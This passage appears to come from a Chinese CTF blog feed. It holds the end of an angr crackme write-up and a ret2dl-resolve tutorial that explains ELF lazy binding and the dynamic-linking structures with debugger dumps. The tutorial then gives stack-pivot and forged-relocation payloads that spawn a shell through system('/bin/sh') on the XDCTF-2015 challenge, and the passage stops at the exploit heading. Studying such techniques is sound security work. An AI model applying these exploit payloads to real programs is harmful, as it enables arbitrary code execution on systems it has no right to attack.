register r13 with 8 unconstrained bytes referenced from 0x400638 (__libc_csu_init+0x18 <span class="keyword">in</span> ais3_crackme (0x400638))</span><br><span class="line">WARNING | 2019-04-24 13:44:41,196 | angr.state_plugins.symbolic_memory | Filling register r14 with 8 unconstrained bytes referenced from 0x40063d (__libc_csu_init+0x1d <span class="keyword">in</span> ais3_crackme (0x40063d))</span><br><span class="line">WARNING | 2019-04-24 13:44:41,203 | angr.state_plugins.symbolic_memory | Filling register r15 with 8 unconstrained bytes referenced from 0x400642 (__libc_csu_init+0x22 <span class="keyword">in</span> ais3_crackme (0x400642))</span><br><span class="line">WARNING | 2019-04-24 13:44:41,209 | angr.state_plugins.symbolic_memory | Filling register rbx with 8 unconstrained bytes referenced from 0x400647 (__libc_csu_init+0x27 <span class="keyword">in</span> ais3_crackme (0x400647))</span><br><span class="line">WARNING | 2019-04-24 13:44:41,364 | angr.state_plugins.symbolic_memory | Filling register cc_ndep with 8 unconstrained bytes referenced from 0x4004b0 (register_tm_clones+0x20 <span class="keyword">in</span> ais3_crackme (0x4004b0))</span><br><span class="line">0x616973337b495f74616b335f673030645f6e307433737d000000000000000000000000000000000000000000000000000000</span><br></pre></td></tr></table></figure></p>
<p>转码后得到flag: ais3{I_tak3_g00d_n0t3s}</p>
<h1 id="0x03：总结"><a href="#0x03：总结" class="headerlink" title="0x03：总结"></a>0x03：总结</h1><p>符号执行相当于是往一个框架里填东西，想要执行什么，不想执行什么自己要很清楚，以后有这种题目直接套模板就行了。</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>题目篇</category>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>Angr</tag>
      </tags>
  </entry>
  <entry>
    <title>ret2dl-resolve</title>
    <url>/2019/05/05/ret2dl-resolve/</url>
    <content><![CDATA[<h1 id="0x00：漏洞介绍"><a href="#0x00：漏洞介绍" class="headerlink" title="0x00：漏洞介绍"></a>0x00：漏洞介绍</h1><p>ret2dl-resovle这种技术在pwn中的运用也挺多的，可以类比Windows下的IAT技术进行学习，了解这个技术之前，我们需要知道ELF文件中各个函数的加载过程，下面就演示一下GOT表是如何加载的，首先我们编译一个简单的程序</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Hello Pwn\n"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"welcome\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;<span class="comment">//gcc -m32 -fno-stack-protector -no-pie -s helloworld.c</span></span><br></pre></td></tr></table></figure>
<p>我们在puts函数下一个断点，观察是如何调用这个函数的</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">thunder@thunder-PC:~/Desktop/CTF/pwn/ret2dl-resolve$ gdb a.out</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; b *0x080482e0</span><br><span class="line">Breakpoint 1 at 0x80482e0</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /home/thunder/Desktop/CTF/pwn/ret2dl-resolve/a.out </span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x080482e0 <span class="keyword">in</span> puts@plt ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> EAX  0x8048500 ◂— dec    eax /* <span class="string">'Hello Pwn\n'</span> */</span><br><span class="line"> EBX  0x804a000 —▸ 0x8049f14 ◂— 0x1</span><br><span class="line"> ECX  0xffffd140 ◂— 0x1</span><br><span class="line"> EDX  0xffffd164 ◂— 0x0</span><br><span class="line"> EDI  0x0</span><br><span class="line"> ESI  0xf7fab000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d4d6c</span><br><span class="line"> EBP  0xffffd128 ◂— 0x0</span><br><span class="line"> ESP  0xffffd10c —▸ 0x804844f ◂— add    esp, 0x10</span><br><span class="line"> EIP  0x80482e0 (puts@plt) ◂— jmp    dword ptr [0x804a00c]</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0x80482e0  &lt;puts@plt&gt;                  jmp    dword ptr [0x804a00c]</span><br><span class="line"> </span><br><span class="line">   0x80482e6  &lt;puts@plt+6&gt;                push   0</span><br><span class="line">   0x80482eb  &lt;puts@plt+11&gt;               jmp    0x80482d0</span><br><span class="line">    ↓</span><br><span class="line">   0x80482d0                              push   dword ptr [0x804a004]</span><br><span class="line">   0x80482d6                              jmp    dword ptr [0x804a008] &lt;0xf7fead80&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7fead80 &lt;_dl_runtime_resolve&gt;       push   eax</span><br><span class="line">   0xf7fead81 &lt;_dl_runtime_resolve+1&gt;     push   ecx</span><br><span class="line">   0xf7fead82 &lt;_dl_runtime_resolve+2&gt;     push   edx</span><br><span class="line">   0xf7fead83 &lt;_dl_runtime_resolve+3&gt;     mov    edx, dword ptr [esp + 0x10]</span><br><span class="line">   0xf7fead87 &lt;_dl_runtime_resolve+7&gt;     mov    eax, dword ptr [esp + 0xc]</span><br><span class="line">   0xf7fead8b &lt;_dl_runtime_resolve+11&gt;    call   _dl_fixup &lt;0xf7fe4f30&gt;</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ esp  0xffffd10c —▸ 0x804844f ◂— add    esp, 0x10</span><br><span class="line">01:0004│      0xffffd110 —▸ 0x8048500 ◂— dec    eax /* <span class="string">'Hello Pwn\n'</span> */</span><br><span class="line">02:0008│      0xffffd114 —▸ 0xffffd1d4 —▸ 0xffffd385 ◂— <span class="string">'/home/thunder/Desktop/CTF/pwn/ret2dl-resolve/a.out'</span></span><br><span class="line">03:000c│      0xffffd118 —▸ 0xffffd1dc —▸ 0xffffd3b8 ◂— <span class="string">'QT_DBL_CLICK_DIST=15'</span></span><br><span class="line">04:0010│      0xffffd11c —▸ 0x804843a ◂— add    ebx, 0x1bc6</span><br><span class="line">05:0014│      0xffffd120 —▸ 0xffffd140 ◂— 0x1</span><br><span class="line">06:0018│      0xffffd124 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0  80482e0 puts@plt</span><br><span class="line">   f 1  804844f</span><br><span class="line">   f 2 f7deee81 __libc_start_main+241</span><br><span class="line">Breakpoint *0x80482e0</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">Hello Pwn</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x080482e0 <span class="keyword">in</span> puts@plt ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> EAX  0x804850b ◂— ja     0x8048572 /* <span class="string">'welcome\n'</span> */</span><br><span class="line"> EBX  0x804a000 —▸ 0x8049f14 ◂— 0x1</span><br><span class="line"> ECX  0x804b160 ◂— <span class="string">'\nello Pwn\n'</span></span><br><span class="line"> EDX  0xf7fac890 (_IO_stdfile_1_lock) ◂— 0x0</span><br><span class="line"> EDI  0x0</span><br><span class="line"> ESI  0xf7fab000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d4d6c</span><br><span class="line"> EBP  0xffffd128 ◂— 0x0</span><br><span class="line"> ESP  0xffffd10c —▸ 0x8048461 ◂— add    esp, 0x10</span><br><span class="line"> EIP  0x80482e0 (puts@plt) ◂— jmp    dword ptr [0x804a00c]</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0x80482e0  &lt;puts@plt&gt;    jmp    dword ptr [0x804a00c] &lt;0xf7e3d250&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7e3d250 &lt;puts&gt;        push   ebp</span><br><span class="line">   0xf7e3d251 &lt;puts+1&gt;      mov    ebp, esp</span><br><span class="line">   0xf7e3d253 &lt;puts+3&gt;      push   edi</span><br><span class="line">   0xf7e3d254 &lt;puts+4&gt;      push   esi</span><br><span class="line">   0xf7e3d255 &lt;puts+5&gt;      push   ebx</span><br><span class="line">   0xf7e3d256 &lt;puts+6&gt;      call   __x86.get_pc_thunk.di &lt;0xf7f0ad7d&gt;</span><br><span class="line"> </span><br><span class="line">   0xf7e3d25b &lt;puts+11&gt;     add    edi, 0x16dda5</span><br><span class="line">   0xf7e3d261 &lt;puts+17&gt;     sub    esp, 0x28</span><br><span class="line">   0xf7e3d264 &lt;puts+20&gt;     push   dword ptr [ebp + 8]</span><br><span class="line">   0xf7e3d267 &lt;puts+23&gt;     call   __strlen_ia32 &lt;0xf7e6e630&gt;</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ esp  0xffffd10c —▸ 0x8048461 ◂— add    esp, 0x10</span><br><span class="line">01:0004│      0xffffd110 —▸ 0x804850b ◂— ja     0x8048572 /* <span class="string">'welcome\n'</span> */</span><br><span class="line">02:0008│      0xffffd114 —▸ 0xffffd1d4 —▸ 0xffffd385 ◂— <span class="string">'/home/thunder/Desktop/CTF/pwn/ret2dl-resolve/a.out'</span></span><br><span class="line">03:000c│      0xffffd118 —▸ 0xffffd1dc —▸ 0xffffd3b8 ◂— <span class="string">'QT_DBL_CLICK_DIST=15'</span></span><br><span class="line">04:0010│      0xffffd11c —▸ 0x804843a ◂— add    ebx, 0x1bc6</span><br><span class="line">05:0014│      0xffffd120 —▸ 0xffffd140 ◂— 0x1</span><br><span class="line">06:0018│      0xffffd124 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0  80482e0 puts@plt</span><br><span class="line">   f 1  8048461</span><br><span class="line">   f 2 f7deee81 __libc_start_main+241</span><br><span class="line">Breakpoint *0x80482e0</span><br></pre></td></tr></table></figure>
<p>可以发现，0x80482e6这个地址，并不直接是libc的puts函数的地址。这是因为linux在程序加载时使用了延迟绑定(lazy<br>load)，只有等到这个函数被调用了，才去把这个函数在libc的地址放到GOT表中。接下来，会再push一个0，再push一个dword ptr [0x804a004]，待会会说这两个参数是什么意思，最后跳到libc的_dl_runtime_resolve去执行。这个函数的目的，是根据2个参数获取到导出函数（这里是puts）的地址，然后放到相应的GOT表，并且调用它。而这个函数的地址也是从GOT表取并且jmp [xxx]过去的，但是这个函数不会延迟绑定，因为所有函数都是用它做的延迟绑定。而第二次调用puts函数则直接指向puts函数的地址，懂得了上面的东西，我们还需要知道一些结构体，类比PE文件的一些结构，用来索引一些结构。</p>
<p><strong>.dynamic</strong></p>
<p>dynamic结构包含了一些关于动态链接的关键信息，我们只需要关注<code>DT_STRTAB</code>, <code>DT_SYMTAB</code>, <code>DT_JMPREL</code>这三个字段，这三个东西分别包含了指向<code>.dynstr</code>, <code>.dynsym</code>, <code>.rel.plt</code>这3个section的指针</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LOAD:08049F14                   ; ELF Dynamic Information</span><br><span class="line">LOAD:08049F14                   ; ===========================================================================</span><br><span class="line">LOAD:08049F14</span><br><span class="line">LOAD:08049F14                   ; Segment type: Pure data</span><br><span class="line">LOAD:08049F14                   ; Segment permissions: Read/Write</span><br><span class="line">LOAD:08049F14                   LOAD segment mempage public &apos;DATA&apos; use32</span><br><span class="line">LOAD:08049F14                   assume cs:LOAD</span><br><span class="line">LOAD:08049F14 01 00 00 00 01 00+stru_8049F14 Elf32_Dyn &lt;1, &lt;1&gt;&gt;</span><br><span class="line">LOAD:08049F14 00 00                                           ; DATA XREF: LOAD:080480BC↑o</span><br><span class="line">LOAD:08049F14                                                 ; .got.plt:0804A000↓o</span><br><span class="line">LOAD:08049F14                                                 ; DT_NEEDED libc.so.6</span><br><span class="line">LOAD:08049F1C 0C 00 00 00 A8 82+Elf32_Dyn &lt;0Ch, &lt;80482A8h&gt;&gt;   ; DT_INIT</span><br><span class="line">LOAD:08049F24 0D 00 00 00 D4 84+Elf32_Dyn &lt;0Dh, &lt;80484D4h&gt;&gt;   ; DT_FINI</span><br><span class="line">LOAD:08049F2C 19 00 00 00 0C 9F+Elf32_Dyn &lt;19h, &lt;8049F0Ch&gt;&gt;   ; DT_INIT_ARRAY</span><br><span class="line">LOAD:08049F34 1B 00 00 00 04 00+Elf32_Dyn &lt;1Bh, &lt;4&gt;&gt;          ; DT_INIT_ARRAYSZ</span><br><span class="line">LOAD:08049F3C 1A 00 00 00 10 9F+Elf32_Dyn &lt;1Ah, &lt;8049F10h&gt;&gt;   ; DT_FINI_ARRAY</span><br><span class="line">LOAD:08049F44 1C 00 00 00 04 00+Elf32_Dyn &lt;1Ch, &lt;4&gt;&gt;          ; DT_FINI_ARRAYSZ</span><br><span class="line">LOAD:08049F4C F5 FE FF 6F AC 81+Elf32_Dyn &lt;6FFFFEF5h, &lt;80481ACh&gt;&gt; ; DT_GNU_HASH</span><br><span class="line">LOAD:08049F54 05 00 00 00 1C 82+Elf32_Dyn &lt;5, &lt;804821Ch&gt;&gt;     ; DT_STRTAB</span><br><span class="line">LOAD:08049F5C 06 00 00 00 CC 81+Elf32_Dyn &lt;6, &lt;80481CCh&gt;&gt;     ; DT_SYMTAB</span><br><span class="line">LOAD:08049F64 0A 00 00 00 4A 00+Elf32_Dyn &lt;0Ah, &lt;4Ah&gt;&gt;        ; DT_STRSZ</span><br><span class="line">LOAD:08049F6C 0B 00 00 00 10 00+Elf32_Dyn &lt;0Bh, &lt;10h&gt;&gt;        ; DT_SYMENT</span><br><span class="line">LOAD:08049F74 15 00 00 00 00 00+Elf32_Dyn &lt;15h, &lt;0&gt;&gt;          ; DT_DEBUG</span><br><span class="line">LOAD:08049F7C 03 00 00 00 00 A0+Elf32_Dyn &lt;3, &lt;804A000h&gt;&gt;     ; DT_PLTGOT</span><br><span class="line">LOAD:08049F84 02 00 00 00 10 00+Elf32_Dyn &lt;2, &lt;10h&gt;&gt;          ; DT_PLTRELSZ</span><br><span class="line">LOAD:08049F8C 14 00 00 00 11 00+Elf32_Dyn &lt;14h, &lt;11h&gt;&gt;        ; DT_PLTREL</span><br><span class="line">LOAD:08049F94 17 00 00 00 98 82+Elf32_Dyn &lt;17h, &lt;8048298h&gt;&gt;   ; DT_JMPREL</span><br><span class="line">LOAD:08049F9C 11 00 00 00 90 82+Elf32_Dyn &lt;11h, &lt;8048290h&gt;&gt;   ; DT_REL</span><br><span class="line">LOAD:08049FA4 12 00 00 00 08 00+Elf32_Dyn &lt;12h, &lt;8&gt;&gt;          ; DT_RELSZ</span><br><span class="line">LOAD:08049FAC 13 00 00 00 08 00+Elf32_Dyn &lt;13h, &lt;8&gt;&gt;          ; DT_RELENT</span><br><span class="line">LOAD:08049FB4 FE FF FF 6F 70 82+Elf32_Dyn &lt;6FFFFFFEh, &lt;8048270h&gt;&gt; ; DT_VERNEED</span><br><span class="line">LOAD:08049FBC FF FF FF 6F 01 00+Elf32_Dyn &lt;6FFFFFFFh, &lt;1&gt;&gt;    ; DT_VERNEEDNUM</span><br><span class="line">LOAD:08049FC4 F0 FF FF 6F 66 82+Elf32_Dyn &lt;6FFFFFF0h, &lt;8048266h&gt;&gt; ; DT_VERSYM</span><br><span class="line">LOAD:08049FCC 00 00 00 00 00 00+Elf32_Dyn &lt;0&gt;                 ; DT_NULL</span><br></pre></td></tr></table></figure>
<p><strong>.dynstr</strong></p>
<p>.dynstr是一个字符串表，index[0]的地方永远是0，然后后面是动态链接所需的字符串，以0结尾，包括导入函数名，比方说这里很明显有个puts。到时候，相关数据结构引用一个字符串时，用的是相对这个section头的偏移，比方说，在这里，就是字符串相对0x804821C的偏移。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LOAD:0804821C                   ; ELF String Table</span><br><span class="line">LOAD:0804821C 00                byte_804821C db 0             ; DATA XREF: LOAD:080481DC↑o</span><br><span class="line">LOAD:0804821C                                                 ; LOAD:080481EC↑o</span><br><span class="line">LOAD:0804821C                                                 ; LOAD:080481FC↑o</span><br><span class="line">LOAD:0804821C                                                 ; LOAD:0804820C↑o</span><br><span class="line">LOAD:0804821D 6C 69 62 63 2E 73+aLibcSo6 db &apos;libc.so.6&apos;,0</span><br><span class="line">LOAD:08048227 5F 49 4F 5F 73 74+aIoStdinUsed db &apos;_IO_stdin_used&apos;,0</span><br><span class="line">LOAD:08048227 64 69 6E 5F 75 73+                              ; DATA XREF: LOAD:0804820C↑o</span><br><span class="line">LOAD:08048236 70 75 74 73 00    aPuts db &apos;puts&apos;,0             ; DATA XREF: LOAD:080481DC↑o</span><br><span class="line">LOAD:0804823B 5F 5F 6C 69 62 63+aLibcStartMain db &apos;__libc_start_main&apos;,0</span><br><span class="line">LOAD:0804823B 5F 73 74 61 72 74+                              ; DATA XREF: LOAD:080481FC↑o</span><br><span class="line">LOAD:0804824D 47 4C 49 42 43 5F+aGlibc20 db &apos;GLIBC_2.0&apos;,0</span><br><span class="line">LOAD:08048257 5F 5F 67 6D 6F 6E+aGmonStart db &apos;__gmon_start__&apos;,0</span><br><span class="line">LOAD:08048257 5F 73 74 61 72 74+                              ; DATA XREF: LOAD:080481EC↑o</span><br></pre></td></tr></table></figure>
<p><strong>.dynsym</strong></p>
<p>结构如下，这是一个符号表（结构体数组），里面记录了各种符号的信息，每个结构体对应一个符号。我们这里只关心函数符号，比如puts函数。结构体定义如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word    st_name; <span class="comment">//符号名，是相对.dynstr起始的偏移，这种引用字符串的方式在前面说过了</span></span><br><span class="line">  Elf32_Addr    st_value;</span><br><span class="line">  Elf32_Word    st_size;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info; <span class="comment">//对于导入函数符号而言，它是0x12</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;</span><br><span class="line">  Elf32_Section st_shndx;</span><br><span class="line">&#125;Elf32_Sym; <span class="comment">//对于导入函数符号而言，其他字段都是0</span></span><br></pre></td></tr></table></figure>
<p>在IDA中显示如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LOAD:080481CC                   ; ELF Symbol Table</span><br><span class="line">LOAD:080481CC 00 00 00 00 00 00+Elf32_Sym &lt;0&gt;</span><br><span class="line">LOAD:080481DC 1A 00 00 00 00 00+Elf32_Sym &lt;offset aPuts - offset byte_804821C, 0, 0, 12h, 0, 0&gt; ; &quot;puts&quot;</span><br><span class="line">LOAD:080481EC 3B 00 00 00 00 00+Elf32_Sym &lt;offset aGmonStart - offset byte_804821C, 0, 0, 20h, 0, 0&gt; ; &quot;__gmon_start__&quot;</span><br><span class="line">LOAD:080481FC 1F 00 00 00 00 00+Elf32_Sym &lt;offset aLibcStartMain - offset byte_804821C, 0, 0, 12h, 0, 0&gt; ; &quot;__libc_start_main&quot;</span><br><span class="line">LOAD:0804820C 0B 00 00 00 EC 84+Elf32_Sym &lt;offset aIoStdinUsed - offset byte_804821C, offset _IO_stdin_used, 4, 11h, 0, 10h&gt; ; &quot;_IO_stdin_used&quot;</span><br></pre></td></tr></table></figure>
<p><strong>.rel.plt</strong></p>
<p>这里是重定位表（不过跟windows那个重定位表概念不同），也是一个结构体数组，每个项对应一个导入函数。结构体定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr    r_offset; <span class="comment">//指向GOT表的指针</span></span><br><span class="line">  Elf32_Word    r_info; <span class="comment">//重定位入口的类型和符号</span></span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure>
<p>在IDA中显示如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LOAD:08048298                   ; ELF JMPREL Relocation Table</span><br><span class="line">LOAD:08048298 0C A0 04 08 07 01+Elf32_Rel &lt;804A00Ch, 107h&gt;    ; R_386_JMP_SLOT puts</span><br><span class="line">LOAD:080482A0 10 A0 04 08 07 03+Elf32_Rel &lt;804A010h, 307h&gt;    ; R_386_JMP_SLOT __libc_start_main</span><br><span class="line">LOAD:080482A0 00 00             LOAD ends</span><br></pre></td></tr></table></figure>
<p>上面的结构体看起来也挺迷糊人的，我只是根据一位大佬的文章总结过来的，下面才是我们需要清楚的关键函数 _dl_runtime_resolve(link_map_obj, reloc_index) ，源码可以在<a href="https://ftp.gnu.org/gnu/glibc/" target="_blank" rel="noopener">这里</a>下载。</p>
<p>_dl_runtime_resolve函数运行模式如下：</p>
<ol>
<li>用link_map访问.dynamic，取出.dynstr, .dynsym, .rel.plt的指针</li>
<li>.rel.plt + 第二个参数求出当前函数的重定位表项Elf32_Rel的指针，记作rel</li>
<li>rel-&gt;r_info &gt;&gt; 8作为.dynsym的下标，求出当前函数的符号表项Elf32_Sym的指针，记作sym</li>
<li>.dynstr + sym-&gt;st_name得出符号名字符串指针</li>
<li>在动态链接库查找这个函数的地址，并且把地址赋值给*rel-&gt;r_offset，即GOT表</li>
<li>调用这个函数</li>
</ol>
<p>利用方法主要是伪造rel.plt表和symtab表，并且修改reloc_index，让重定位函数解析我们伪造的结构体，借此修改符号解析的位置，对于一些字段的获取，我们可以用objdump来寻找，如下图</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">thunder@thunder-PC:~/Desktop/CTF/pwn/ret2dl-resolve$ objdump -s -j .rel.plt ./main</span><br><span class="line"></span><br><span class="line">./main：     文件格式 elf32-i386</span><br><span class="line"></span><br><span class="line">Contents of section .rel.plt:</span><br><span class="line"> 8048330 0ca00408 07010000 10a00408 07020000  ................</span><br><span class="line"> 8048340 14a00408 07040000 18a00408 07050000  ................</span><br><span class="line"> 8048350 1ca00408 07060000                    ........        </span><br><span class="line">thunder@thunder-PC:~/Desktop/CTF/pwn/ret2dl-resolve$ objdump -s -j .dynsym ./main</span><br><span class="line"></span><br><span class="line">./main：     文件格式 elf32-i386</span><br><span class="line"></span><br><span class="line">Contents of section .dynsym:</span><br><span class="line"> 80481d8 00000000 00000000 00000000 00000000  ................</span><br><span class="line"> 80481e8 33000000 00000000 00000000 12000000  3...............</span><br><span class="line"> 80481f8 27000000 00000000 00000000 12000000  <span class="string">'...............</span></span><br><span class="line"><span class="string"> 8048208 52000000 00000000 00000000 20000000  R........... ...</span></span><br><span class="line"><span class="string"> 8048218 20000000 00000000 00000000 12000000   ...............</span></span><br><span class="line"><span class="string"> 8048228 3a000000 00000000 00000000 12000000  :...............</span></span><br><span class="line"><span class="string"> 8048238 4c000000 00000000 00000000 12000000  L...............</span></span><br><span class="line"><span class="string"> 8048248 2c000000 44a00408 04000000 11001a00  ,...D...........</span></span><br><span class="line"><span class="string"> 8048258 0b000000 3c860408 04000000 11001000  ....&lt;...........</span></span><br><span class="line"><span class="string"> 8048268 1a000000 40a00408 04000000 11001a00  ....@...........</span></span><br><span class="line"><span class="string">thunder@thunder-PC:~/Desktop/CTF/pwn/ret2dl-resolve$ objdump -s -j .dynstr ./main</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">./main：     文件格式 elf32-i386</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Contents of section .dynstr:</span></span><br><span class="line"><span class="string"> 8048278 006c6962 632e736f 2e36005f 494f5f73  .libc.so.6._IO_s</span></span><br><span class="line"><span class="string"> 8048288 7464696e 5f757365 64007374 64696e00  tdin_used.stdin.</span></span><br><span class="line"><span class="string"> 8048298 7374726c 656e0072 65616400 7374646f  strlen.read.stdo</span></span><br><span class="line"><span class="string"> 80482a8 75740073 65746275 66005f5f 6c696263  ut.setbuf.__libc</span></span><br><span class="line"><span class="string"> 80482b8 5f737461 72745f6d 61696e00 77726974  _start_main.writ</span></span><br><span class="line"><span class="string"> 80482c8 65005f5f 676d6f6e 5f737461 72745f5f  e.__gmon_start__</span></span><br><span class="line"><span class="string"> 80482d8 00474c49 42435f32 2e3000             .GLIBC_2.0.</span></span><br></pre></td></tr></table></figure>
<h1 id="0x01：例子"><a href="#0x01：例子" class="headerlink" title="0x01：例子"></a>0x01：例子</h1><p><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2dlresolve/XDCTF-2015/main" target="_blank" rel="noopener">题目链接</a></p>
<p>首先检查保护机制</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">thunder@thunder-PC:~/Desktop/CTF/pwn/ret2dl-resolve$ checksec main</span><br><span class="line">[*] <span class="string">'/home/thunder/Desktop/CTF/pwn/ret2dl-resolve/main'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<p><strong>main</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">4</span>]; <span class="comment">// [esp+0h] [ebp-6Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// [esp+18h] [ebp-54h]</span></span><br><span class="line">  <span class="keyword">int</span> *v7; <span class="comment">// [esp+64h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = &amp;argc;</span><br><span class="line">  <span class="built_in">strcpy</span>(buf, <span class="string">"Welcome to XDCTF2015~!\n"</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v6, <span class="number">0</span>, <span class="number">0x4C</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, buf);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">  write(<span class="number">1</span>, buf, v3);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>vuln</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vuln()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+Ch] [ebp-6Ch]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>题目思路非常清晰，read函数存在栈溢出，但是没有libc，ROPgadget也很少，这里就可以考虑ret2dl-resolve，我们先将栈转移到bss段，然后构造结构体，实现对system函数的解析，然后getshell</p>
<p>第一处payload负责栈转移，将eip覆盖为.rel.plt地址，传递一个可控的rel_offset，使rel_entry落在可控区域</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">'a'</span>*<span class="number">108</span> + p32(bss_addr - <span class="number">20</span>) + p32(elf.plt[<span class="string">'read'</span>]) + p32(leave_ret) + p32(<span class="number">0</span>) + p32(bss_addr - <span class="number">20</span>) + p32(<span class="number">0x50</span>)</span><br></pre></td></tr></table></figure>
<p>第二处的payload负责伪造rel_entry使sym_entry落在可控区域，伪造sym_entry使sym_name为‘system’</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload2 = p32(<span class="number">0x0</span>) <span class="comment"># pop ebp, 随便设反正不用了</span></span><br><span class="line">payload2 += p32(DYN_RESOL_PLT) <span class="comment"># resolve的PLT，就是前面说的push link_map那个位置</span></span><br><span class="line">payload2 += p32(FAKE_REL_OFF) <span class="comment"># 伪造的重定位表OFFSET</span></span><br><span class="line">payload2 += p32(<span class="number">0xdeadbeef</span>) <span class="comment"># 返回地址</span></span><br><span class="line">payload2 += p32(bin_sh) <span class="comment"># 参数'/bin/sh'</span></span><br><span class="line">payload2 += fake_rel_plt + fake_dynsym + fake_dynstr</span><br></pre></td></tr></table></figure>
<p><strong>exp</strong></p>
